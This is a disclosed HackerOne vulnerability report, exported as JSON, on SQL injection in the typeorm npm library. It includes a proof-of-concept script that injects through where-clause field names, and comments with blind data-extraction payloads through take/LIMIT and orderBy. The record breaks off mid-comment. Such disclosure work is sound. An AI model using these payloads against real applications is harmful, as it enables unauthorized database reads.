{"id":319458,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMTk0NTg=","url":"https://hackerone.com/reports/319458","title":"typeorm does not properly escape parameters when building SQL queries, resulting in potential SQLi","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2018-02-25T04:06:39.828Z","submitted_at":"2018-02-25T04:06:39.828Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"chalker","url":"/chalker","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/068/907/abd483931dad2c93e376707dd59719cc277309cd_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":23949,"url":"https://hackerone.com/nodejs-ecosystem","handle":"nodejs-ecosystem","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Node.js third-party modules","twitter_handle":"","website":"https://nodejs.org/en/security/","about":"This program is used to handle vulnerabilities in the Node.js ecosystem."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2019-04-03T20:27:32.311Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2019-03-04T20:27:31.019Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"I would like to report an SQLi in typeorm.\n\nIt allows to insert potentially user-controlled content into the queries without proper escaping, in cases where that is not verified additionally in the applications that are using typeorm library.\n\n## Module\n\n**module name:** typeorm\n**version:** 0.1.12\n**npm page:** `https://www.npmjs.com/package/typeorm`\n\n### Description\n\n\u003e TypeORM is an ORM that can run in NodeJS, Browser, Cordova, PhoneGap and Ionic platforms and can be used with TypeScript and JavaScript (ES5, ES6, ES7). Its goal to always support latest JavaScript features and provide features that help you to develop any kind of applications that use databases - from small applications with a few tables to large scale enterprise applications with multiple databases.\n\n### Module Stats\n\n583 downloads in the last day\n19 143 downloads in the last week\n68 193 downloads in the last month\n\n~818316 estimated downloads per year\n\n## Description\n\ntypeorm constructs SQL queries from structured input, and the problem is that it doesn't do proper escaping of field names and limit/offset parameters, so in setups where those are user-controlled that can cause an SQL injection vulnerability.\n\n## Steps To Reproduce:\n\n`typeorm init --name typeormtest --database sqlite`\n\nUse the following code to reproduce:\n\n```js\nimport \"reflect-metadata\";\nimport {createConnection} from \"typeorm\";\nimport {User} from \"./entity/User\";\n\ncreateConnection().then(async connection =\u003e {\n    console.log(\"Inserting a new user into the database...\");\n    const user = new User();\n    user.firstName = \"Timber\";\n    user.lastName = \"Saw\";\n    user.age = 25;\n    await connection.manager.save(user);\n    console.log(\"Saved a new user with id: \" + user.id);\n\n    const repository = connection.getRepository(User);\n\n    // SQLi on field names\n    const where = { firstName: \"Jim\" };\n    const opts = { where: where };\n    where[\"age=25 OR 25=\"] = 25;\n\n    // SQLi on limit/offset:\n    //opts[\"skip\"] = \"OLOLO\";\n    //opts[\"take\"] = \"LOLOL\";\n\n    const res = await repository.find(opts);\n    console.log(res);\n}).catch(error =\u003e console.log(error));\n```\n\nThe code is mostly taken from the standard `typeorm` example, only lines from `const repository` to `console.log(res)` were added.\n\n## Supporting Material/References:\n\n- Arch Linux Current\n- Node.js 9.5.0\n- npm 5.6.0\n- sqlite3@3.1.13\n\n## Wrap up\n\n- I contacted the maintainer to let him know: N\n- I opened an issue in the related repository: N\n\n## Impact\n\nSQL injection.\nSee https://www.owasp.org/index.php/SQL_Injection\n\nThe hacker selected the **SQL Injection** weakness. This vulnerability type requires contextual information from the hacker. They provided the following answers:\n\n**Verified**\nYes\n\n**What exploitation technique did you utilize?**\nClassic / In-Band\n\n**Please describe the results of your verification attempt.**\nObserved executed query.\n\n","vulnerability_information_html":"\u003cp\u003eI would like to report an SQLi in typeorm.\u003c/p\u003e\n\n\u003cp\u003eIt allows to insert potentially user-controlled content into the queries without proper escaping, in cases where that is not verified additionally in the applications that are using typeorm library.\u003c/p\u003e\n\n\u003ch2 id=\"module\"\u003eModule\u003c/h2\u003e\n\n\u003cp\u003e\u003cstrong\u003emodule name:\u003c/strong\u003e typeorm\u003cbr\u003e\n\u003cstrong\u003eversion:\u003c/strong\u003e 0.1.12\u003cbr\u003e\n\u003cstrong\u003enpm page:\u003c/strong\u003e \u003ccode\u003ehttps://www.npmjs.com/package/typeorm\u003c/code\u003e\u003c/p\u003e\n\n\u003ch3 id=\"description\"\u003eDescription\u003c/h3\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eTypeORM is an ORM that can run in NodeJS, Browser, Cordova, PhoneGap and Ionic platforms and can be used with TypeScript and JavaScript (ES5, ES6, ES7). Its goal to always support latest JavaScript features and provide features that help you to develop any kind of applications that use databases - from small applications with a few tables to large scale enterprise applications with multiple databases.\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003ch3 id=\"module-stats\"\u003eModule Stats\u003c/h3\u003e\n\n\u003cp\u003e583 downloads in the last day\u003cbr\u003e\n19 143 downloads in the last week\u003cbr\u003e\n68 193 downloads in the last month\u003c/p\u003e\n\n\u003cp\u003e~818316 estimated downloads per year\u003c/p\u003e\n\n\u003ch2 id=\"description\"\u003eDescription\u003c/h2\u003e\n\n\u003cp\u003etypeorm constructs SQL queries from structured input, and the problem is that it doesn\u0026#39;t do proper escaping of field names and limit/offset parameters, so in setups where those are user-controlled that can cause an SQL injection vulnerability.\u003c/p\u003e\n\n\u003ch2 id=\"steps-to-reproduce\"\u003eSteps To Reproduce:\u003c/h2\u003e\n\n\u003cp\u003e\u003ccode\u003etypeorm init --name typeormtest --database sqlite\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003eUse the following code to reproduce:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"k\"\u003eimport\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003ereflect-metadata\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"k\"\u003eimport\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nx\"\u003ecreateConnection\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e \u003cspan class=\"k\"\u003efrom\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003etypeorm\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"k\"\u003eimport\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nx\"\u003eUser\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e \u003cspan class=\"k\"\u003efrom\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e./entity/User\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\n\u003cspan class=\"nx\"\u003ecreateConnection\u003c/span\u003e\u003cspan class=\"p\"\u003e().\u003c/span\u003e\u003cspan class=\"nx\"\u003ethen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003easync\u003c/span\u003e \u003cspan class=\"nx\"\u003econnection\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003econsole\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elog\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eInserting a new user into the database...\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"kd\"\u003econst\u003c/span\u003e \u003cspan class=\"nx\"\u003euser\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nx\"\u003eUser\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003euser\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003efirstName\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eTimber\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003euser\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elastName\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eSaw\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003euser\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eage\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e25\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eawait\u003c/span\u003e \u003cspan class=\"nx\"\u003econnection\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003emanager\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003esave\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003euser\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003econsole\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elog\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eSaved a new user with id: \u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"nx\"\u003euser\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eid\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\n    \u003cspan class=\"kd\"\u003econst\u003c/span\u003e \u003cspan class=\"nx\"\u003erepository\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003econnection\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003egetRepository\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eUser\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\n    \u003cspan class=\"c1\"\u003e// SQLi on field names\u003c/span\u003e\n    \u003cspan class=\"kd\"\u003econst\u003c/span\u003e \u003cspan class=\"nx\"\u003ewhere\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e \u003cspan class=\"na\"\u003efirstName\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eJim\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e \u003cspan class=\"p\"\u003e};\u003c/span\u003e\n    \u003cspan class=\"kd\"\u003econst\u003c/span\u003e \u003cspan class=\"nx\"\u003eopts\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e \u003cspan class=\"na\"\u003ewhere\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"nx\"\u003ewhere\u003c/span\u003e \u003cspan class=\"p\"\u003e};\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003ewhere\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eage=25 OR 25=\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e25\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\n    \u003cspan class=\"c1\"\u003e// SQLi on limit/offset:\u003c/span\u003e\n    \u003cspan class=\"c1\"\u003e//opts[\u0026quot;skip\u0026quot;] = \u0026quot;OLOLO\u0026quot;;\u003c/span\u003e\n    \u003cspan class=\"c1\"\u003e//opts[\u0026quot;take\u0026quot;] = \u0026quot;LOLOL\u0026quot;;\u003c/span\u003e\n\n    \u003cspan class=\"kd\"\u003econst\u003c/span\u003e \u003cspan class=\"nx\"\u003eres\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003eawait\u003c/span\u003e \u003cspan class=\"nx\"\u003erepository\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003efind\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eopts\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003econsole\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elog\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eres\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}).\u003c/span\u003e\u003cspan class=\"k\"\u003ecatch\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eerror\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"nx\"\u003econsole\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elog\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eerror\u003c/span\u003e\u003cspan class=\"p\"\u003e));\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe code is mostly taken from the standard \u003ccode\u003etypeorm\u003c/code\u003e example, only lines from \u003ccode\u003econst repository\u003c/code\u003e to \u003ccode\u003econsole.log(res)\u003c/code\u003e were added.\u003c/p\u003e\n\n\u003ch2 id=\"supporting-material-references\"\u003eSupporting Material/References:\u003c/h2\u003e\n\n\u003cul\u003e\n\u003cli\u003eArch Linux Current\u003c/li\u003e\n\u003cli\u003eNode.js 9.5.0\u003c/li\u003e\n\u003cli\u003enpm 5.6.0\u003c/li\u003e\n\u003cli\u003e\u003ca title=\"sqlite3@3.1.13\" href=\"mailto:sqlite3@3.1.13\" rel=\"nofollow noopener noreferrer\"\u003esqlite3@3.1.13\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch2 id=\"wrap-up\"\u003eWrap up\u003c/h2\u003e\n\n\u003cul\u003e\n\u003cli\u003eI contacted the maintainer to let him know: N\u003c/li\u003e\n\u003cli\u003eI opened an issue in the related repository: N\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eSQL injection.\u003cbr\u003e\nSee \u003ca title=\"https://www.owasp.org/index.php/SQL_Injection\" href=\"/redirect?url=https%3A%2F%2Fwww.owasp.org%2Findex.php%2FSQL_Injection\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.owasp.org/index.php/SQL_Injection\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eThe hacker selected the \u003cstrong\u003eSQL Injection\u003c/strong\u003e weakness. This vulnerability type requires contextual information from the hacker. They provided the following answers:\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eVerified\u003c/strong\u003e\u003cbr\u003e\nYes\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eWhat exploitation technique did you utilize?\u003c/strong\u003e\u003cbr\u003e\nClassic / In-Band\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003ePlease describe the results of your verification attempt.\u003c/strong\u003e\u003cbr\u003e\nObserved executed query.\u003c/p\u003e\n","weakness":{"id":67,"name":"SQL Injection"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2019-04-03T20:27:31.119Z","allow_singular_disclosure_after":-54896796.49504079,"singular_disclosure_allowed":true,"vote_count":1,"voters":["meepmerp"],"severity":{"rating":"medium","score":6.4,"author_type":"User","metrics":{"attack_vector":"network","attack_complexity":"high","privileges_required":"low","user_interaction":"none","scope":"unchanged","confidentiality":"high","integrity":"low","availability":"low"}},"structured_scope":{"databaseId":6411,"asset_type":"SOURCE_CODE","asset_identifier":"typeorm","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":2431772,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Note that unescaped LIMIT/OFFSET could be also used for data extraction, e.g. this works:\n\n```\nopts[\"take\"] = '(SELECT case when SUBSTR(lastName,1,1) = \"S\" then 1 else 0 end from user where age = 25 limit 1)';\n```","markdown_message":"\u003cp\u003eNote that unescaped LIMIT/OFFSET could be also used for data extraction, e.g. this works:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eopts[\u0026quot;take\u0026quot;] = \u0026#39;(SELECT case when SUBSTR(lastName,1,1) = \u0026quot;S\u0026quot; then 1 else 0 end from user where age = 25 limit 1)\u0026#39;;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","automated_response":false,"created_at":"2018-02-25T14:45:52.755Z","updated_at":"2018-02-25T14:45:52.755Z","actor":{"username":"chalker","cleared":false,"url":"/chalker","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/068/907/abd483931dad2c93e376707dd59719cc277309cd_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2467680,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I contacted https://gitter.im/pleerock and reported that.\nThe `take`/`skip` part was independently fixed in a new version released since the time of this report, others weren't.\n`where` key issue is still valid.\n\nAnd anoter testcase, on `orderBy`:\n```js\nconst res = await repository.createQueryBuilder(\"user\")\n    .orderBy(\n      \"user.age\",\n      JSON.parse('\"DESC LIMIT (SELECT case when SUBSTR(lastName,1,1) = \\\\\"S\\\\\" then 1 else 0 end from user where age = 25 limit 1)\"')\n    )\n    .getMany();\n    console.log(res);\n```\nThat one is also valid on the latest version.\n\n`opts[\"order\"] = {\"lastName ASC LIMIT 1;\": 1};` also seems to work.","markdown_message":"\u003cp\u003eI contacted \u003ca title=\"https://gitter.im/pleerock\" href=\"/redirect?url=https%3A%2F%2Fgitter.im%2Fpleerock\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://gitter.im/pleerock\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e and reported that.\u003cbr\u003e\nThe \u003ccode\u003etake\u003c/code\u003e/\u003ccode\u003eskip\u003c/code\u003e part was independently fixed in a new version released since the time of this report, others weren\u0026#39;t.\u003cbr\u003e\n\u003ccode\u003ewhere\u003c/code\u003e key issue is still valid.\u003c/p\u003e\n\n\u003cp\u003eAnd anoter testcase, on \u003ccode\u003eorderBy\u003c/code\u003e:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"kd\"\u003econst\u003c/span\u003e \u003cspan class=\"nx\"\u003eres\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003eawait\u003c/span\u003e \u003cspan class=\"nx\"\u003erepository\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ecreateQueryBuilder\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003euser\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eorderBy\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\n      \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003euser.age\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n      \u003cspan class=\"nx\"\u003eJSON\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eparse\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026quot;DESC LIMIT (SELECT case when SUBSTR(lastName,1,1) = \u003c/span\u003e\u003cspan class=\"se\"\u003e\\\\\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026quot;S\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\\\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026quot; then 1 else 0 end from user where age = 25 limit 1)\u0026quot;\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003egetMany\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003econsole\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elog\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eres\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThat one is also valid on the latest version.\u003c/p\u003e\n\n\u003cp\u003e\u003ccode\u003eopts[\u0026quot;order\u0026quot;] = {\u0026quot;lastName ASC LIMIT 1;\u0026quot;: 1};\u003c/code\u003e also seems to work.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-03-07T07:34:56.530Z","updated_at":"2018-03-07T07:49:25.465Z","actor":{"username":"chalker","cleared":false,"url":"/chalker","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/068/907/abd483931dad2c93e376707dd59719cc277309cd_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2482740,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"@chalker do you want me to reach the maintainer here?","markdown_message":"\u003cp\u003e\u003ca href=\"/chalker\"\u003e@chalker\u003c/a\u003e do you want me to reach the maintainer here?\u003c/p\u003e\n","automated_response":false,"created_at":"2018-03-12T13:44:28.395Z","updated_at":"2018-03-12T13:44:28.395Z","actor":{"username":"vdeturckheim","cleared":false,"url":"/vdeturckheim","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/161/010/6f383ac0f9296c13b5ac0d38741f0685dbace58c_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2482816,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@vdeturckheim No, I already got in contact with them.","markdown_message":"\u003cp\u003e\u003ca href=\"/vdeturckheim\"\u003e@vdeturckheim\u003c/a\u003e No, I already got in contact with them.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-03-12T14:05:02.498Z","updated_at":"2018-03-12T14:05:52.583Z","actor":{"username":"chalker","cleared":false,"url":"/chalker","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/068/907/abd483931dad2c93e376707dd59719cc277309cd_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2579055,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@chalker are they working on a fix? ","markdown_message":"\u003cp\u003e\u003ca href=\"/chalker\"\u003e@chalker\u003c/a\u003e are they working on a fix? \u003c/p\u003e\n","automated_response":false,"created_at":"2018-04-08T19:54:50.870Z","updated_at":"2018-04-08T19:54:50.870Z","actor":{"username":"vdeturckheim","cleared":false,"url":"/vdeturckheim","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/161/010/6f383ac0f9296c13b5ac0d38741f0685dbace58c_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2579062,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I think this should be fixed for some time already now, but I need to verify that. Will do that a bit later.","markdown_message":"\u003cp\u003eI think this should be fixed for some time already now, but I need to verify that. Will do that a bit later.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-04-08T19:56:41.990Z","updated_at":"2018-04-08T19:57:21.061Z","actor":{"username":"chalker","cleared":false,"url":"/chalker","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/068/907/abd483931dad2c93e376707dd59719cc277309cd_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2748212,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@chalker did you have time to check?","markdown_message":"\u003cp\u003e\u003ca href=\"/chalker\"\u003e@chalker\u003c/a\u003e did you have time to check?\u003c/p\u003e\n","automated_response":false,"created_at":"2018-05-15T19:51:07.960Z","updated_at":"2018-05-15T19:51:07.960Z","actor":{"username":"vdeturckheim","cleared":false,"url":"/vdeturckheim","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/161/010/6f383ac0f9296c13b5ac0d38741f0685dbace58c_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3182804,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Gentle ping @chalker ","markdown_message":"\u003cp\u003eGentle ping \u003ca href=\"/chalker\"\u003e@chalker\u003c/a\u003e 